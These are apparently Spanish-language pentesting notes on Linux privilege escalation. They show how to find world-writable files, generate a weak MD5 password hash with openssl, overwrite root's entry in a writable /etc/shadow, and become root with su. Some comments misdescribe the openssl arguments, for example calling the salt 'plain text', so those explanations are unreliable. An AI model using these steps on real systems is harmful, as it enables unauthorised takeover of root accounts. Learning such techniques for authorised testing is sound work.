# Escalación de privilegios en Linux

Tags: #Linux #PrivEsc #Meterpreter

## Permisos débiles 

```bash 
❯ find / -not -type l -perm -o+w        # Buscaremos archivos con permisos debiles en lo que podamos escribir 
	# /etc/shadow                        Este archivo contiene las passwd hasheadas

❯ openssl passwd -1 -salt abc password  # Utilizaremos esta tool para crear nuestra passwd hasheada y poderla reemplazar en el archivo '/etc/shadow' que en esta ocasion nos deja poderlo editar 

	# passwd = Queremos generar una contraseña 
	# 1 = Algoritmo mas debil con la que la queremos hashear 
	# abc = Mostrar en texto plano 
	# password = La palabra que queremos hashear


# Ahora al momento de editar el archivo '/etc/shadow', en el usuario 'root' eliminamos el '*' y en su lugar colocamos todo lo que nos dio la tool 'openssl'

❯ su                                     # Comando para subir a 'super-root', ahí colocamos la nueva passwd y seremos root
```